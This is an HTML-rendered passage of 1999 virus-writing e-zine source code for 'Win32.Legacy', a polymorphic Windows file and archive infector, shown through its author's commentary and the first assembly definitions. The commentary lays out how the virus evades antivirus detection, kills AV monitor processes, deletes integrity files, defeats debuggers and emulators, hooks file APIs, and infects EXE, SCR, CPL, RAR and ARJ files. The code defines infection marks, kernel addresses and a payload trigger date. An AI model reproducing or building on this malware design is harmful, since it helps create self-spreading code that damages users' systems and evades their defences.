<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>legacy.asm</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc0">
</span><span class="sc1">;                                        /-----------------------------\
;                                        | Xine - issue #4 - Phile 214 |</span><span class="sc0">
</span><span class="sc1">;                                        \-----------------------------/</span><span class="sc0">

</span><span class="sc1">; [Win32.Legacy] - MultiThreaded/Poly/EPO/MMX/RDA/AntiAV/PE/RAR/ARJ,etc.</span><span class="sc0">
</span><span class="sc1">; Copyright (c) 1999 by Billy Belcebu/iKX</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Introduction ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This is a polymorphic heavily armoured  multitask virus. It's  undetectable</span><span class="sc0">
</span><span class="sc1">; by all the most powerful AVs (August 1999) such as are AVP, NODICE, etc. It</span><span class="sc0">
</span><span class="sc1">; has two layers of encryption (as my Win32.Thorin), the first one is polymo-</span><span class="sc0">
</span><span class="sc1">; rphic, made by MMXE v1.01, and the second one  is an antidebug/antiemulator</span><span class="sc0">
</span><span class="sc1">; one, using also MMX opcodes if available. So, this is the world's first vi-</span><span class="sc0">
</span><span class="sc1">; rus using MMX opcodes, and i am proud of it! :) Well, the polymorphic engi-</span><span class="sc0">
</span><span class="sc1">; ne has a sorta plug-in, called PHIRE v1.00 that  is able  to generate a 256</span><span class="sc0">
</span><span class="sc1">; polymorphic block of code that will be placed  at host entrypoint  for pass</span><span class="sc0">
</span><span class="sc1">; the control to the polymorphic decryptor  at the last section. So, it's so-</span><span class="sc0">
</span><span class="sc1">; mething like  an EPO feature. This is  also my  first  virus  that  infects</span><span class="sc0">
</span><span class="sc1">; archives (RAR &amp; ARJ). This virus also have RDA features, by means of my new</span><span class="sc0">
</span><span class="sc1">; engine called iENC, that works with  little blocks of code, instead a whole</span><span class="sc0">
</span><span class="sc1">; virus. There are 13h ;) routines in this virus that are encrypted independe</span><span class="sc0">
</span><span class="sc1">; ntly from the  two normal layers of  the  virus... It's a  great feature :)</span><span class="sc0">
</span><span class="sc1">; This babe makes my Thorin to seem a joke... It beats Thorin in almost every</span><span class="sc0">
</span><span class="sc1">; aspect. The  only bad  point this virus has is, in some  extreme cases, the</span><span class="sc0">
</span><span class="sc1">; speed. I've tried to fix  that optimizing  a bit  the thread execution, and</span><span class="sc0">
</span><span class="sc1">; its order. Also, i've made the virus to be executed with the highest priori</span><span class="sc0">
</span><span class="sc1">; ty of execution. So the delay will be minimal (i hope), and in fastest PCs,</span><span class="sc0">
</span><span class="sc1">; will be unnoticeable. It's  possible  that  this  virus  has   bugs, but in</span><span class="sc0">
</span><span class="sc1">; all my tests, it worked perfectly. But nothing is perfect.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Well, that's  too much for  an introduction. Let's see a deeper description</span><span class="sc0">
</span><span class="sc1">; of all this.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Threads ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; The virus' execution is as follows:</span><span class="sc0">
</span><span class="sc1">;     </span><span class="sc0">
</span><span class="sc1">; INFECTED FILE           ÚÄÄÄÄÄÄÄÄÄÄ¿         </span><span class="sc0">
</span><span class="sc1">;  ÚÄÄÄĞÄÄÄ¿            ÉÍµ Thread 1 ³   ÚÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;  ³       Æ&gt;ÍÍÍÍ»      º ÀÄÄÄÄÄÄÄÄÄÄÙ ÉÍµ Thread 2 ³</span><span class="sc0">
</span><span class="sc1">;  ³ Virus ³ ÚÄÄÄĞÄÄÄÄ¿ º ÉÍÍÍÍÍÍÍÍÍÍÍÍ¼ ÀÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;  ³       ³ ³        Æ&gt;¼ º   ÚÄÄÄÄÄÄÄÄÄÄ¿     </span><span class="sc0">
</span><span class="sc1">;  ÀÄÄÄÒÄÄÄÙ ³        Æ&gt;ÍÍ¼ ÉÍµ Thread 3 ³     </span><span class="sc0">
</span><span class="sc1">;      º     ³  Main  Æ&gt;ÍÍÍÍ¼ ÀÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;      º     ³ Thread Æ&gt;ÍÍÍÍ»       </span><span class="sc0">
</span><span class="sc1">;      º     ³        Æ&gt;ÍÍ» º ÚÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;      º     ³        ³   º ÈÍµ Thread 4 ³        </span><span class="sc0">
</span><span class="sc1">;      º     ÀÄÄÄÒÄÄÄÄÙ   º   ÀÄÄÄÄÄÄÄÄÄÄÙ ÚÄÄÄÄÄÄÄÄÄÄ¿</span><span class="sc0">
</span><span class="sc1">;      ÈÍÍÍÍÍÍÍÍ&lt;¼        ÈÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ Thread 5 ³</span><span class="sc0">
</span><span class="sc1">;                  ÚÄÄÄÄÄÄÄÄÄÄ¿            ÀÄÄÄÄÒÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;                  ³ Thread 6 Æ&lt;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¼</span><span class="sc0">
</span><span class="sc1">;                  ÀÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Í -&gt; Thread being executed</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; So, as you can see, the virus body launches a thread, the main thread, and</span><span class="sc0">
</span><span class="sc1">; the main thread launches 6 threads, and controls their execution flow: the</span><span class="sc0">
</span><span class="sc1">; first 4 ones are launched and executed at the same time, while the followin</span><span class="sc0">
</span><span class="sc1">; 2 must follow an order, one after another. Let's see what does each thread:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Thread 1 : This thread is executed the first, and it consists in a</span><span class="sc0">
</span><span class="sc1">;                    loop that terminates the processes of AVP Monitor and</span><span class="sc0">
</span><span class="sc1">;                    AMON (monitor of NOD-ICE).</span><span class="sc0">
</span><span class="sc1">;       + Thread 2 : This thread is the anti-debugging one. Application level</span><span class="sc0">
</span><span class="sc1">;                    debuggers should die with it.</span><span class="sc0">
</span><span class="sc1">;       + Thread 3 : This thread deletes from the current directory most of</span><span class="sc0">
</span><span class="sc1">;                    all the integrity checks of all AV and programs.</span><span class="sc0">
</span><span class="sc1">;       + Thread 4 : This thread hooks all possible APIs from host import ta-</span><span class="sc0">
</span><span class="sc1">;                    ble, so it is the PerProcess residence thread.</span><span class="sc0">
</span><span class="sc1">;       + Thread 5 : This thread prepares the virus for infection, setting up</span><span class="sc0">
</span><span class="sc1">;                    the directories to infect, etc.</span><span class="sc0">
</span><span class="sc1">;       + Thread 6 : This thread is used for infect in all the retrieved dir-</span><span class="sc0">
</span><span class="sc1">;                    ectories all EXE, SCR, CPL, RAR, ARJ files.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Each thread is protected by a SEH handler, so we can handle all the possi-</span><span class="sc0">
</span><span class="sc1">; ble errors that could happen in their execution. This adds more security to</span><span class="sc0">
</span><span class="sc1">; the virus, and makes it to become lotsa more robust.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Engines ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus features 3 engines: MMXE v1.01, PHIRE v1.00 and iENC v1.00. Lets</span><span class="sc0">
</span><span class="sc1">; see what will do each one of them:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + MMXE  : This engine will generate two decryptors, that will be able</span><span class="sc0">
</span><span class="sc1">;                 to decrypt the first encryption layer of the virus (but the</span><span class="sc0">
</span><span class="sc1">;                 oly one that is polymorphic). Why two decryptors? Well, the</span><span class="sc0">
</span><span class="sc1">;                 execution of one or another depends of the existence of the</span><span class="sc0">
</span><span class="sc1">;                 MMX opcodes (i.e. if  the CPU is MMX). One of them, the one</span><span class="sc0">
</span><span class="sc1">;                 that will be executed firstly, has MMX opcodes used as gar-</span><span class="sc0">
</span><span class="sc1">;                 bage, and its  decryption  operation is also a  MMX opcode.</span><span class="sc0">
</span><span class="sc1">;                 The second decryptor is an 'ussual' polymorphic one.</span><span class="sc0">
</span><span class="sc1">;       + PHIRE : This is a plug-in for MMXE. It generates a block of 256 by-</span><span class="sc0">
</span><span class="sc1">;                 tes of polymorphic code that will be placed at the entrypo-</span><span class="sc0">
</span><span class="sc1">;                 in of the host. The particularity of that code is, besides</span><span class="sc0">
</span><span class="sc1">;                 the EntryPoint Obscuring (EPO) ability that it gives to the</span><span class="sc0">
</span><span class="sc1">;                 virus, is that the generated code will generate an excepti-</span><span class="sc0">
</span><span class="sc1">;                 on handler (SEH), for laterly generate a fault, thus bypas-</span><span class="sc0">
</span><span class="sc1">;                 sing the control to the handler, that will pass the control</span><span class="sc0">
</span><span class="sc1">;                 to the MMXE decryptor. This will stop every known emulator.</span><span class="sc0">
</span><span class="sc1">;       + iENC  : The  Internal ENCryptor  is a RDA  encryptor/decryptor that</span><span class="sc0">
</span><span class="sc1">;                 brings  you  the  possibility of  encrypt/decrypt blocks of</span><span class="sc0">
</span><span class="sc1">;                 code inside the virus itself. It's very simple,besides that</span><span class="sc0">
</span><span class="sc1">;                 is very useful for annoy a bit more the AV people. And that</span><span class="sc0">
</span><span class="sc1">;                 is my target.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Decryption ]</span><span class="sc0">
</span><span class="sc1">;                                            Glossary.-</span><span class="sc0">
</span><span class="sc1">; ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿&lt;ÄÄ Host entrypoint         POLY#1- PHIRE generated code</span><span class="sc0">
</span><span class="sc1">; ³   POLY#1    ³                            POLY#2- MMXE generated decryptor</span><span class="sc0">
</span><span class="sc1">; Ã Ä Ä Ä Ä Ä Ä ´Ä¿  Now  jump over all the  ENCR#3- Second encryption layer</span><span class="sc0">
</span><span class="sc1">; ³             ³ ³  host code that was not  </span><span class="sc0">
</span><span class="sc1">; ³    REST     ³ ³  overwritten till reach </span><span class="sc0">
</span><span class="sc1">; ³     OF      ³ ³  the MMXE layer.</span><span class="sc0">
</span><span class="sc1">; ³    HOST     ³ ³</span><span class="sc0">
</span><span class="sc1">; ³             ³ ³</span><span class="sc0">
</span><span class="sc1">; Ã Ä Ä Ä Ä Ä Ä ´&lt;Ù</span><span class="sc0">
</span><span class="sc1">; ³   POLY#2    ³    Now decrypt the next layer</span><span class="sc0">
</span><span class="sc1">; Ã Ä Ä Ä Ä Ä Ä ´</span><span class="sc0">
</span><span class="sc1">; ³   ENCR#3    ³    Final decryption of virus body</span><span class="sc0">
</span><span class="sc1">; Ã Ä Ä Ä Ä Ä Ä ´</span><span class="sc0">
</span><span class="sc1">; ³ VIRUS CODE! ÃÄ&gt;  Some independent blocks of this are also encrypted.</span><span class="sc0">
</span><span class="sc1">; ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ APIs used ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; They are  retrieved knowing  only their CRC32. This, as  you  can see, is a</span><span class="sc0">
</span><span class="sc1">; great saving of bytes.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + KERNEL32.DLL          - FindFirstFileA, FindNextFileA, FindClose,</span><span class="sc0">
</span><span class="sc1">;                                 CreateFileA, DeleteFileA, SetFilePointer,</span><span class="sc0">
</span><span class="sc1">;                                 SetFileAttributesA, CloseHandle,</span><span class="sc0">
</span><span class="sc1">;                                 GetCurrentDirectoryA, SetCurrentDirectoryA,</span><span class="sc0">
</span><span class="sc1">;                                 GetWindowsDirectoryA, GetSystemDirectoryA,</span><span class="sc0">
</span><span class="sc1">;                                 CreateFileMappingA, MapViewOfFile,</span><span class="sc0">
</span><span class="sc1">;                                 UnmapViewOfFile,SetEndOfFile,GetProcAddress,</span><span class="sc0">
</span><span class="sc1">;                                 LoadLibraryA, GetSystemTime, CreateThread,</span><span class="sc0">
</span><span class="sc1">;                                 WaitForSingleObject,ExitThread,GetTickCount,</span><span class="sc0">
</span><span class="sc1">;                                 FreeLibrary,WriteFile,GlobalAlloc,GlobalFree,</span><span class="sc0">
</span><span class="sc1">;                                 GetFileSize, GetFileAttributesA, ReadFile,</span><span class="sc0">
</span><span class="sc1">;                                 GetCurrentProcess, GetPriorityClass,</span><span class="sc0">
</span><span class="sc1">;                                 SetPriorityClass</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + USER32.DLL            - FindWindowA, PostMessageA, MessageBoxA</span><span class="sc0">
</span><span class="sc1">;       + ADVAPI32.DLL          - RegCreateKeyExA, RegSetValueExA</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ APIs hooked ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; All these APIs are part of the '@@Hookz' structure (see data zone of virus)</span><span class="sc0">
</span><span class="sc1">; and they are got from  the Import  Table only  knowing its CRC32. This is a</span><span class="sc0">
</span><span class="sc1">; nice feature, we save many bytes with it.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + With generic hooker   - MoveFileA</span><span class="sc0">
</span><span class="sc1">;                               - CopyFileA</span><span class="sc0">
</span><span class="sc1">;                               - GetFullPathNameA</span><span class="sc0">
</span><span class="sc1">;                               - DeleteFileA</span><span class="sc0">
</span><span class="sc1">;                               - WinExec</span><span class="sc0">
</span><span class="sc1">;                               - CreateFileA</span><span class="sc0">
</span><span class="sc1">;                               - CreateProcessA</span><span class="sc0">
</span><span class="sc1">;                               - GetFileAttributesA</span><span class="sc0">
</span><span class="sc1">;                               - SetFileAttributesA</span><span class="sc0">
</span><span class="sc1">;                               - _lopen</span><span class="sc0">
</span><span class="sc1">;                               - MoveFileExA</span><span class="sc0">
</span><span class="sc1">;                               - CopyFileExA</span><span class="sc0">
</span><span class="sc1">;                               - OpenFile</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + With special hooker   - GetProcAddress</span><span class="sc0">
</span><span class="sc1">;                               - FindFirstFileA</span><span class="sc0">
</span><span class="sc1">;                               - FindNextFileA.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Features ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Now here will go the blessed list of what this babe is able to do:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Infects EXE, SCR and CPL files.</span><span class="sc0">
</span><span class="sc1">;       + Drops an infected file to RAR and ARJ archives (dropper is packed)</span><span class="sc0">
</span><span class="sc1">;       + All targets (EXE/SCR/CPL/RAR/ARJ) are infected if they:</span><span class="sc0">
</span><span class="sc1">;               - are in \WINDOWS directory</span><span class="sc0">
</span><span class="sc1">;               - are in \WINDOWS\SYSTEM directory</span><span class="sc0">
</span><span class="sc1">;               - are in current directory</span><span class="sc0">
</span><span class="sc1">;               - are accessed by one of the hooked functions</span><span class="sc0">
</span><span class="sc1">;       + Obtains API addresses knowing only its CRC32 (ET &amp; IT).</span><span class="sc0">
</span><span class="sc1">;       + EntryPoint Obscuring (EPO), used PHIRE v1.00</span><span class="sc0">
</span><span class="sc1">;       + Two layers of encryption:</span><span class="sc0">
</span><span class="sc1">;               - MMXE generated decryptor</span><span class="sc0">
</span><span class="sc1">;               - Simple non-poly MMX decryptor, also anti-emulators.</span><span class="sc0">
</span><span class="sc1">;       + Some blocks of code are encrypted (RDA) with iENC v1.00</span><span class="sc0">
</span><span class="sc1">;       + Anti-Emulation and Anti-Heuristic techniques.</span><span class="sc0">
</span><span class="sc1">;       + Anti-Monitors, kills the process of AVP Monitor and AMON</span><span class="sc0">
</span><span class="sc1">;       + Anti-Debugging (SEH, IsDebuggerPresent, FS:[20h], Threads, SoftICE)</span><span class="sc0">
</span><span class="sc1">;       + MultiThreading (see 'Threads' description above)</span><span class="sc0">
</span><span class="sc1">;       + Per-Process residence (ImportTable/GetProcAddress)</span><span class="sc0">
</span><span class="sc1">;       + Fast infector (FindFirstFileA/FindNextFileA)</span><span class="sc0">
</span><span class="sc1">;       + Kills AV CRC files.</span><span class="sc0">
</span><span class="sc1">;       + Infects all PE without caring about its ImageBase.</span><span class="sc0">
</span><span class="sc1">;       + Avoid problems with .reloc section</span><span class="sc0">
</span><span class="sc1">;       + Able to work under Win95, Win98, WinNT, and Win2k.</span><span class="sc0">
</span><span class="sc1">;       + Payload: Shows a lame messagebox with a lame message, and after it</span><span class="sc0">
</span><span class="sc1">;         makes a little changes in the registry ;)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Greetings (random order) ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + Qozah/29A     -&gt; Finally you did it! Win32.Unreal rulez!</span><span class="sc0">
</span><span class="sc1">;       + Benny/29A     -&gt; I'll wait for your meta! Btw, bring me a czech beer</span><span class="sc0">
</span><span class="sc1">;       + Vecna         -&gt; Pray to the real and only god... yourself!</span><span class="sc0">
</span><span class="sc1">;       + Super/29A     -&gt; Thanx for pointing me bugs and optimizations...</span><span class="sc0">
</span><span class="sc1">;       + b0z0/iKX      -&gt; I recommend you a padanian band called Lacuna Coil</span><span class="sc0">
</span><span class="sc1">;       + StarZer0/iKX  -&gt; What did you say to yer mother for go to Amsterdam?</span><span class="sc0">
</span><span class="sc1">;       + Int13h        -&gt; Espero tu carta ansioso! </span><span class="sc0">
</span><span class="sc1">;       + Ypsilon       -&gt; Finish VAS goddamit!!</span><span class="sc0">
</span><span class="sc1">;       + GriYo/29A     -&gt; El £nico que llama "cagadas" a sus virus :)</span><span class="sc0">
</span><span class="sc1">;       + MDriller/29A  -&gt; You help me, i help you... compensation law ;)</span><span class="sc0">
</span><span class="sc1">;       + Owl[FS]       -&gt; You'll find the perfect girl for your needs...</span><span class="sc0">
</span><span class="sc1">;       + VirusBust/29A -&gt; Espero que seas feliz con tu nuevo estado civil ;)</span><span class="sc0">
</span><span class="sc1">;       + MrSandman     -&gt; Lo mismo te digo...</span><span class="sc0">
</span><span class="sc1">;       + JQwerty       -&gt; Aunque nos pese, pues tambien te digo lo mismo ;)</span><span class="sc0">
</span><span class="sc1">;       + Wintermute    -&gt; Algun dia entender s a estos mon¢gamos X-D</span><span class="sc0">
</span><span class="sc1">;       + Tcp/29A       -&gt; I'll wait for your HLL PE infector :)</span><span class="sc0">
</span><span class="sc1">;       + Rajaat        -&gt; The Twisted Nails Of Faith... COF RuleZ!</span><span class="sc0">
</span><span class="sc1">;       + Somniun       -&gt; Mandame un mail, please</span><span class="sc0">
</span><span class="sc1">;       + SeptiC        -&gt; You'd have my vote... sure!</span><span class="sc0">
</span><span class="sc1">;       + TechnoPhunk/TI-&gt; I recommend you to hear Marilyn Manson...</span><span class="sc0">
</span><span class="sc1">;       + Mandragore    -&gt; Mail me pleeeeease</span><span class="sc0">
</span><span class="sc1">;       + TheWizard     -&gt; A ver cuando veo algo tuyo pa Win32...</span><span class="sc0">
</span><span class="sc1">;       + Navi/PHYMOSYS -&gt; Y la #9? :)</span><span class="sc0">
</span><span class="sc1">;       + Frontis       -&gt; Amo a tu plextor de 8x!</span><span class="sc0">
</span><span class="sc1">;       + nIgr0         -&gt; Yo me jubilare cuando tu entres en algun grupo :)</span><span class="sc0">
</span><span class="sc1">;       + SlageHammer   -&gt; Come to Valencia!</span><span class="sc0">
</span><span class="sc1">;       + T-2000        -&gt; I didn't liked to be infected with yer Kriz ;)</span><span class="sc0">
</span><span class="sc1">;       + zAxOn         -&gt; Este virus de abajo te va a infectar...</span><span class="sc0">
</span><span class="sc1">;       + Gigabyte[UC]  -&gt; What about that VBS worm?</span><span class="sc0">
</span><span class="sc1">;       + Yesna         -&gt; PUTA!</span><span class="sc0">
</span><span class="sc1">;       + Lord Julus    -&gt; Get a Blind Guardian CD!</span><span class="sc0">
</span><span class="sc1">;       + Hansi Kursch  -&gt; I hope you'll be able to compose again soon!</span><span class="sc0">
</span><span class="sc1">;       + J.R.R.Tolkien -&gt; Awesome folklore!</span><span class="sc0">
</span><span class="sc1">;       + Karl Marx     -&gt; For give me something to believe in.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Fucks ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       + J. M. Aznar   -&gt; I'll dance over your grave, fascist sucker</span><span class="sc0">
</span><span class="sc1">;       + E. Zaplana    -&gt; Ke haze un tio de murzia presidiendo mi comunidad?</span><span class="sc0">
</span><span class="sc1">;       + J. Gil y Gil  -&gt; Tiene una estatua de Franco... no comments.</span><span class="sc0">
</span><span class="sc1">;       + A. Pinochet   -&gt; TO PRISON, MOTHERFUCKER!</span><span class="sc0">
</span><span class="sc1">;       + F. Franco     -&gt; I'm happy: you're dead</span><span class="sc0">
</span><span class="sc1">;       + A. Hitler     -&gt; The worst in all the mankind history</span><span class="sc0">
</span><span class="sc1">;       + S. Milosevic  -&gt; The Hitler of our days</span><span class="sc0">
</span><span class="sc1">;       + B. Yeltsin    -&gt; Stop drinking vodka!</span><span class="sc0">
</span><span class="sc1">;       + All the USA   -&gt; You can control others governments, but not me.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; [ Final thoughts ]</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus (and its possible next versions) will be my last "megainfector".</span><span class="sc0">
</span><span class="sc1">; I will probably add to it ZIP infection, a  compression engine, a code emu-</span><span class="sc0">
</span><span class="sc1">; lator (that i have almost  finished) and  more  features, but  i think i'll</span><span class="sc0">
</span><span class="sc1">; guide my steps to smaller viruses. For example, i am writing another Ring-0</span><span class="sc0">
</span><span class="sc1">; virus, that  will  feature  S&amp;D technology (of course, giving  the deserved</span><span class="sc0">
</span><span class="sc1">; greet to SSR), and i  am writing some  engines such as a compression one, a</span><span class="sc0">
</span><span class="sc1">; code emulator, a self-emulated poly engine, and much more. Also, i'm making</span><span class="sc0">
</span><span class="sc1">; the first steps of the Itxoiten project, building its macros,and developing</span><span class="sc0">
</span><span class="sc1">; the ITX header. As you can see, i'm really active in coding. I hope i'll be</span><span class="sc0">
</span><span class="sc1">; able to publish some of that things soon. Of course, i've also almost fini-</span><span class="sc0">
</span><span class="sc1">; shed my Virus Writing Guide for Win32, that is, at this moment, much bigger</span><span class="sc0">
</span><span class="sc1">; that its  equivalent for MS-DOS. I hope to finish  it soon too. Well... now</span><span class="sc0">
</span><span class="sc1">; it's my time to talk about "my things" :) Ok, ok, i'll  tell you about what</span><span class="sc0">
</span><span class="sc1">; happened me this  last week... Firstly (and painly), my  beloved  Panasonic</span><span class="sc0">
</span><span class="sc1">; discman (paid with my own money) have  broken up... Secondly, my headphones</span><span class="sc0">
</span><span class="sc1">; of that discman, have  also broken  up.  I think it happened because i have</span><span class="sc0">
</span><span class="sc1">; recently  had a  motorbike  crash (finishing  with myself  rolling over the</span><span class="sc0">
</span><span class="sc1">; fucking  road)  while hearing  music with  the discman... And, today, while</span><span class="sc0">
</span><span class="sc1">; i was going (again) with the motorbike , a  fucking bee have  bitten  me at</span><span class="sc0">
</span><span class="sc1">; my face (and now my face seems  a fucking ball because it). Damn, this week</span><span class="sc0">
</span><span class="sc1">; hasn't been the best  one of my life. I can  only now  day  one thing, that</span><span class="sc0">
</span><span class="sc1">; only the spanish readers will understand: MEKAGšEN DIOS! Ok, this is enough</span><span class="sc0">
</span><span class="sc1">; for today...                                            ...Fade to black...</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;    -To code is as sex: one error, and you'll cry the rest of your life-</span><span class="sc0">
</span><span class="sc1">;                             (Murphy's law)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; (c) 1999 Billy Belcebu/iKX</span><span class="sc0">

    </span><span class="sc2">.586p</span><span class="sc0">
    </span><span class="sc9">.model</span><span class="sc0">  </span><span class="sc10">flat</span><span class="sc0">       

</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ShellAboutA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">                        </span><span class="sc1">; Thanx 4 this c00l api, Vecna</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0">   </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">TRUE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">01h</span><span class="sc0">
</span><span class="sc5">FALSE</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">FALSE</span><span class="sc0">

</span><span class="sc5">virus_size</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_end</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">virus_start</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">shit_size</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">legacy</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">section_flags</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000020h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">20000000h</span><span class="sc0"> </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc2">80000000h</span><span class="sc0">
</span><span class="sc5">temp_attributes</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">00000080h</span><span class="sc0">
</span><span class="sc5">n_Handles</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">50d</span><span class="sc0">
</span><span class="sc5">WFD_HndSize</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">n_Handles</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">n_infections</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">05h</span><span class="sc0">

</span><span class="sc5">mark</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">04Ch</span><span class="sc0">                    </span><span class="sc1">; PE Header where put mark</span><span class="sc0">
</span><span class="sc5">inf_mark</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc3">"YCGL"</span><span class="sc0">                  </span><span class="sc1">; Mark for infected PE's</span><span class="sc0">
</span><span class="sc5">archive_mark</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc3">"GL"</span><span class="sc0">                    </span><span class="sc1">; Mark for infected archives</span><span class="sc0">

</span><span class="sc5">kernel_w9x</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0BFF70000h</span><span class="sc0">              </span><span class="sc1">; Win95/98 Kernel</span><span class="sc0">
</span><span class="sc5">kernel_wNT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">077F00000h</span><span class="sc0">              </span><span class="sc1">; WinNT kernel</span><span class="sc0">
</span><span class="sc5">kernel_w2k</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">077E00000h</span><span class="sc0">              </span><span class="sc1">; Win2000 kernel</span><span class="sc0">

</span><span class="sc5">nDay</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">31d</span><span class="sc0">                     </span><span class="sc1">; Day when activate payload</span><span class="sc0">
</span><span class="sc5">nMonth</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">07d</span><span class="sc0">                     </span><span class="sc1">; Month when activate payload</span><span class="sc0">

</span><span class="sc5">Billy_Bel</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">0BBh</span><span class="sc0">                    </span><span class="sc1">; Any problem? :)</span><span class="sc0">

